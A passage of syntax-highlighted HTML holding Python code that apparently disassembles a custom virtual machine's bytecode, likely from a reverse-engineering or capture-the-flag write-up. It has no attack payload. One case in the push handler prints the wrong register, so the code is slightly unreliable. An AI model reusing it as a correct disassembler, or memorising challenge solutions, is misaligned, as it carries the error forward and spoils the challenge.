class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">155</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">188</span><span class=\"token punctuation\">,</span> <span class=\"token number\">172</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">206</span><span class=\"token punctuation\">,</span> <span class=\"token number\">250</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">185</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span> <span class=\"token number\">232</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">203</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> <span class=\"token number\">252</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span> <span class=\"token number\">214</span><span class=\"token punctuation\">,</span> <span class=\"token number\">141</span><span class=\"token punctuation\">,</span> <span class=\"token number\">215</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span> <span class=\"token number\">136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">153</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">191</span><span class=\"token punctuation\">,</span> <span class=\"token number\">232</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">169</span><span class=\"token punctuation\">,</span> <span class=\"token number\">189</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">194</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">248</span><span class=\"token punctuation\">,</span> <span class=\"token number\">245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">152</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token number\">193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">237</span><span class=\"token punctuation\">,</span> <span class=\"token number\">176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">167</span><span class=\"token punctuation\">,</span> <span class=\"token number\">253</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span> <span class=\"token number\">139</span><span class=\"token punctuation\">,</span> <span class=\"token number\">98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">219</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token number\">143</span><span class=\"token punctuation\">,</span> <span class=\"token number\">156</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18432</span><span class=\"token punctuation\">,</span> <span class=\"token number\">61696</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16384</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8448</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13569</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token number\">25600</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30721</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63744</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20992</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9472</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18176</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64768</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26881</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23552</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token number\">44801</span><span class=\"token punctuation\">,</span> <span class=\"token number\">45568</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20993</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20225</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20480</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34049</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52480</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8960</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63488</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token number\">3072</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52992</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15617</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17665</span><span class=\"token punctuation\">,</span> <span class=\"token number\">33280</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53761</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">54529</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1537</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41473</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56832</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token number\">42497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51713</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>code<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>ip<span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mov</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov reg[0],data[reg[2]]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov data[reg[2]],reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mov reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">]\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>​    <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"mov reg[</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">],</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[2]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">3</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"98\"></td><td><pre></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"push reg[3]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>  ip<span class=\"token operator\">+=</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre></pre></td></tr><tr><td data-num=\"103\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>  <span class=\"token keyword\">global</span> code<span class=\"token punctuation\">,</span>ip</pre></td></tr><tr><td data-num=\"106\"></td><td><pre></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>  <span class=\"token keyword\">match</span> code<span class=\"token punctuation\">[</span>ip<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"108\"></td><td><pre></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>​     <span class=\"token keyword\">case</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>​        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pop reg[0]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 